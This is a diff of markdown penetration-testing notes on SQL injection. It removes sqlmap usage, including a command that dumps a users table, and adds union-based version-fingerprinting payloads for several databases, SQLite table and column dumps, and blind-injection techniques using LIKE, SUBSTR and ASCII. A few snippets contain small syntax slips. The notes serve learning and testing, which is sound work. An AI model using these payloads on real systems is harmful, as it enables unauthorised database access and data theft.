@@ -136,36 +136,8 @@ Mitigations
 
 From the [SQLMap GitHub Repository](https://github.com/sqlmapproject/sqlmap) (25k ⭐): "sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.".
 
-Try injecting a form
 
-```bash
-# try login.php
-sqlmap -u URL/login.php
-```
-
-Try dumping the table "users" in the database "db_name"
-
-```bash
-sqlmap -u UGL/login.php -D db_name -T users –dump
-```
-
-Notes
-
-* Try both with, and without union tests
-* `XXX xxx is vulnerable`: enter yes to try exploiting this parameter
 </div><div>
-
-* `-u URL`: try injecting this URL
-* `--dbs`: display all databases
-* `--tables`: display tables
-* `--column`: display columns
-* `-C xx, yy`: display only columns xx, and yy
-* `--dbms=some_dbms`: provide dbms, increase the chances of success
-* `-D db_name`: the name of the database
-* `--time-sec timeout`: specify a timeout
-* `--dump`: save current data
-* `--dump-all`: save all data
-* `--batch`: do all requests at once (do not way for input)
 
 > [SQLMap CheatSheet](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet) (external)
 </div></div>
@@ -232,10 +204,16 @@ The second objective is to find the DBMS, and it's version, just to ensure that 
 
 ```sql
 SELECT [...] UNION SELECT @@version, NULL, NULL, NULL
+SELECT [...] UNION SELECT sqlite_version(), NULL, NULL, NULL
+SELECT [...] UNION SELECT VERSION(), NULL, NULL, NULL
+SELECT [...] UNION SELECT (SELECT banner FROM v$version), NULL, NULL, NULL
+-- ...
 ```
 
-> Note that there may be an error at this point if the server was expecting the first value of the select to be an "int" (for instance). Simply move the call of `@@version`, until it's successful.
+> Note that there may be an error at this point if the server was expecting the first value of the select to be an "int" (for instance). Simply move the call of `@@version/...`, until it's successful.
 </div><div>
+
+**Note**: functions available in MariaDB/MySQL, and PostgresSQL maybe
 
 The third objective is to find the database name.
 
@@ -260,6 +238,14 @@ Now, you have everything you need to dump all results.
 ```sql
 SELECT [...] UNION SELECT group_concat(col1,":",col2 SEPARATOR '<br>'), NULL, NULL, NULL FROM table_name
 ```
+
+<p class="mt-3"><b>Notes for SQLite</b></p>
+
+```sql
+SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
+SELECT [...] UNION SELECT group_concat(col1 || ":" || col2, '<br>') [...]
+```
+
 </div></div>
 
 <hr class="sl">
@@ -280,9 +266,18 @@ Then, your starting point will be
 GET /account?id=1' AND 1=0-- -
 ```
 
-Now, the id is valid, but you will see "page not found". That's how you will have to play with the request. When you got "page not found", it will mean that you condition failed, and bit-by-bit you will map the database. There are two well-known way to process
+Now, even if the id is valid, you will see "page not found". If you use `1=1`, everything should work like before. That's how you will have to play with the request. When you got "page not found", it will mean that you condition failed, and bit-by-bit you will map the database. There are two well-known way to process
 
-* Using ASCII
+* Using LIKE
+
+```
+WHERE text LIKE 'a%'
+-- is text starting with 'a'
+WHERE text LIKE '%0%'
+-- do the text contains 0?
+```
+
+* Using SUBSTR, and ASCII/CAST
 
 ```
 WHERE ASCII(SUBSTR(text,1,1) = ASCII('a')
@@ -291,14 +286,18 @@ WHERE ASCII(SUBSTR(text,1,1) = ASCII('a')
 -- and, check if this is the same as the ASCII of 'a'
 ```
 
-* Using LIKE
+**Why?**: You would (obviously) want to go with LIKE, but it won't always work. For instance, the parameter may be transformed to lowerCase/upperCase according to what the programmer wants...
 
 ```
-WHERE text LIKE 'a%'
--- is text starting with 'a'
+-- find the ASCII (do it inside YOUR DBMS)
+SELECT ASCII('A') -- 65
+
+-- then use
+WHERE ASCII(SUBSTR(text,1,1) = 65
+-- some are using "65 to HEX" = X'41'
+WHERE SUBSTR(text,1,1) = CAST(X'41' as char)
 ```
 
-> I will, obviously use LIKE, because it's more efficient
 </div><div>
 
 First, to avoid losing too much motivation, it may be better to test how many characters you are looking for. For instance, for the database name
@@ -310,6 +309,8 @@ First, to avoid losing too much motivation, it may be better to test how many ch
 ' AND LENGTH(database()) == 14 -- --
 [...]
 ```
+
+**Examples with LIKE**
 
 Then, you can start. As everything is the same as for **Union-based SQLi**, and the process is the same for every text, I will only show an example with getting the database name.
 
@@ -335,13 +336,6 @@ If the query returns true, you may have one more database to check up. In the en
 
 ```
 ' UNION SELECT NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema = 'database_name' and table_name like 'table_name' and COLUMN_NAME LIKE "a%" -- -
-```
-
-You may try other kind of question than only "is the nth character x".
-
-```
--- do the table name contains 0?
-table_name LIKE '%0%'
 ```
 </div></div>
 
